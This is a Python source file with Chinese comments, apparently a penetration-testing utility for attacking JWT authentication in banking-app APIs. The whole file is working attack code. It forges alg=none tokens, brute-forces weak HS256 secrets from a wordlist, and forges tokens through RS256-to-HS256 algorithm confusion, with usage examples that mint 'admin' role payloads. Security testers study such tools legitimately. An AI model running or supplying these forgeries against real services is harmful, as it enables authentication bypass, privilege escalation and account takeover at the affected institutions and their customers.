#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT 解析 / 伪造 / 攻击工具 (零依赖)
===================================
银行 App API 认证常用 JWT。测试点: alg=none、弱密钥、算法混淆、SM2 签名。

格式: base64url(header).base64url(payload).base64url(signature)
算法: HS256 (对称) / RS256 (RSA) / SM2 (国密签名) / none

用法:
    # 解析
    python jwt.py decode <token>

    # 伪造
    python jwt.py forge --algo none --payload '{"uid":1,"role":"admin"}'
    python jwt.py forge --algo hs256 --secret s3cr3t --payload '{"uid":1}'
    python jwt.py forge --algo rs256 --privkey <dhex> --n <nhex> --e 65537 \
        --payload '{"uid":1,"role":"admin"}'
    python jwt.py forge --algo sm2 --privkey <dhex> --payload '{"uid":1}'

    # HS256 弱密钥爆破 (字典)
    python jwt.py crack --wordlist pw.txt --token <token>

    # RS256→HS256 算法混淆 (公钥当 HMAC 密钥)
    python jwt.py confuse --pubkey-hex <pubkey bytes hex> --payload '{"role":"admin"}'

    # 自检
    python jwt.py --selftest
"""
import argparse
import base64
import hmac
import hashlib
import json
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

from rsa import sign as rsa_sign
from sm2_k_reuse import N, GX, GY, sm3_hash, scalar_mul, sm2_sign, sm2_za
from sm2_k_reuse import DEFAULT_ID


def _b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _b64u_decode(s: str) -> bytes:
    pad = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64u_decode_json(s: str):
    return json.loads(_b64u_decode(s))


def _sign(msg: bytes, algo: str, secret: bytes = None, priv=None) -> bytes:
    if algo == 'HS256':
        return hmac.new(secret, msg, hashlib.sha256).digest()
    if algo == 'RS256':
        return rsa_sign(msg, priv['d'], priv['n'])
    if algo == 'SM2':
        d = priv['d']
        pub = scalar_mul(d, (GX, GY))
        # JWT SM2 签名: SM2-with-SM3, 摘要直接对 header.payload, 输出 r||s
        e = int.from_bytes(sm3_hash(msg), 'big')
        import secrets
        k = secrets.randbelow(N - 1) + 1
        x1, _ = scalar_mul(k, (GX, GY))
        r = (e + x1) % N
        s = pow(1 + d, -1, N) * (k - r * d) % N
        return r.to_bytes(32, 'big') + s.to_bytes(32, 'big')
    raise ValueError(f"不支持的算法 {algo}")


def forge(algo, payload: dict, secret: bytes = None, priv=None,
          header_extra: dict = None) -> str:
    header = {'alg': algo, 'typ': 'JWT'}
    if header_extra:
        header.update(header_extra)
    h = _b64u_encode(json.dumps(header, separators=(',', ':')).encode())
    p = _b64u_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing = f'{h}.{p}'.encode()
    if algo == 'none':
        return f'{h}.{p}.'
    sig = _b64u_encode(_sign(signing, algo, secret, priv))
    return f'{h}.{p}.{sig}'


def crack(token: str, wordlist) -> str:
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("非法 JWT")
    header = _b64u_decode_json(parts[0])
    if header.get('alg') != 'HS256':
        raise ValueError(f"仅支持 HS256 爆破 (当前 alg={header.get('alg')})")
    msg = f'{parts[0]}.{parts[1]}'.encode()
    sig = _b64u_decode(parts[2])
    for line in wordlist:
        word = line.rstrip('\n\r').encode()
        if hmac.new(word, msg, hashlib.sha256).digest() == sig:
            return word.decode('utf-8', 'replace')
    return None


def confuse(pubkey_hex: str, payload: dict) -> str:
    """RS256→HS256 混淆: 用 RSA 公钥字节作 HS256 密钥伪造。"""
    return forge('HS256', payload, secret=bytes.fromhex(pubkey_hex))


def selftest():
    ok = True
    secret = b's3cr3t_key'
    payload = {'uid': 1, 'role': 'user'}

    # HS256 伪造→结构验证
    tok = forge('HS256', payload, secret)
    parts = tok.split('.')
    h = _b64u_decode_json(parts[0])
    p = _b64u_decode_json(parts[1])
    ok = ok and h['alg'] == 'HS256' and p['uid'] == 1
    # 签名可验证
    ok = ok and hmac.new(secret, f'{parts[0]}.{parts[1]}'.encode(),
                         hashlib.sha256).digest() == _b64u_decode(parts[2])
    print(f"  [{'OK' if ok else 'FAIL'}] HS256 伪造+验签")

    # alg=none
    t2 = forge('none', payload)
    ok = ok and t2.split('.')[-1] == '' and _b64u_decode_json(t2.split('.')[0])['alg'] == 'none'
    print(f"  [{'OK' if t2.split('.')[-1] == '' else 'FAIL'}] alg=none 伪造")

    # crack 弱密钥
    weak = forge('HS256', payload, b'123456')
    found = crack(weak, ['password', '123456', 'admin'])
    ok = ok and found == '123456'
    print(f"  [{'OK' if found == '123456' else 'FAIL'}] HS256 弱密钥爆破 → {found}")

    # RS256 伪造 (RSA 密钥)
    kp = __import__('rsa').gen_keypair(1024)
    t3 = forge('RS256', payload, priv={'d': kp['d'], 'n': kp['n']})
    h3 = _b64u_decode_json(t3.split('.')[0])
    ok = ok and h3['alg'] == 'RS256'
    print(f"  [{'OK' if h3['alg'] == 'RS256' else 'FAIL'}] RS256 伪造")

    # SM2 伪造 (签名长度 64B)
    d = 0x3945208F7B2144B13F36E38AC6D39F95889393692860B51A42FB81EF4DF7C5B8
    t4 = forge('SM2', payload, priv={'d': d})
    sig_len = len(_b64u_decode(t4.split('.')[2]))
    ok = ok and sig_len == 64
    print(f"  [{'OK' if sig_len == 64 else 'FAIL'}] SM2 伪造 (签名 {sig_len}B)")

    print(f"\n[{'全部通过' if ok else '存在失败'}] JWT 自检")
    sys.exit(0 if ok else 1)


def main():
    ap = argparse.ArgumentParser(description='JWT 解析/伪造/攻击')
    ap.add_argument('--selftest', action='store_true')
    ap.add_argument('op', nargs='?', choices=['decode', 'forge', 'crack', 'confuse'])
    ap.add_argument('token', nargs='?', help='JWT token')
    ap.add_argument('--algo', choices=['none', 'HS256', 'RS256', 'SM2'], default='HS256')
    ap.add_argument('--payload', help='JSON payload 字符串')
    ap.add_argument('--secret', help='HS256 密钥')
    ap.add_argument('--privkey', help='私钥 d (hex)')
    ap.add_argument('--n', help='RSA 模数 n (hex)')
    ap.add_argument('--e', type=int, default=65537)
    ap.add_argument('--wordlist', help='爆破字典文件')
    ap.add_argument('--pubkey-hex', help='RSA 公钥字节 (hex), confuse 用')
    args = ap.parse_args()

    if args.selftest:
        selftest(); return
    if not args.op:
        sys.exit("[-] 需要操作: decode / forge / crack / confuse")

    if args.op == 'decode':
        if not args.token:
            sys.exit("[-] 需要 token")
        try:
            parts = args.token.split('.')
            h = _b64u_decode_json(parts[0])
            p = _b64u_decode_json(parts[1])
        except Exception as e:
            sys.exit(f"[-] 解析失败: {e}")
        print("[*] Header :", json.dumps(h, indent=2, ensure_ascii=False))
        print("[*] Payload:", json.dumps(p, indent=2, ensure_ascii=False))
        print(f"[*] 签名   : {parts[2] if len(parts) > 2 else '(空)'}")
        if h.get('alg') == 'none':
            print("[!] 警告: alg=none, 服务端可能接受无签名 token")
        return

    if args.op == 'forge':
        payload = json.loads(args.payload) if args.payload else {}
        priv = None
        secret = None
        if args.algo == 'HS256':
            if not args.secret:
                sys.exit("[-] HS256 需要 --secret")
            secret = args.secret.encode()
        elif args.algo == 'RS256':
            if not (args.privkey and args.n):
                sys.exit("[-] RS256 需要 --privkey 和 --n")
            priv = {'d': int(args.privkey, 16), 'n': int(args.n, 16)}
        elif args.algo == 'SM2':
            if not args.privkey:
                sys.exit("[-] SM2 需要 --privkey")
            priv = {'d': int(args.privkey, 16)}
        tok = forge(args.algo, payload, secret, priv)
        print(f"[*] JWT ({args.algo}):")
        print(tok)
        return

    if args.op == 'crack':
        if not (args.token and args.wordlist):
            sys.exit("[-] crack 需要 --token 和 --wordlist")
        found = crack(args.token, open(args.wordlist, encoding='utf-8', errors='ignore'))
        print(f"[{'+] 密钥命中: ' + found if found else '-] 未命中'}")
        return

    if args.op == 'confuse':
        if not (args.pubkey_hex and args.payload):
            sys.exit("[-] confuse 需要 --pubkey-hex 和 --payload")
        payload = json.loads(args.payload)
        tok = confuse(args.pubkey_hex, payload)
        print("[*] RS256→HS256 混淆伪造 (用 RSA 公钥作 HMAC 密钥):")
        print(tok)
        return


if __name__ == '__main__':
    main()
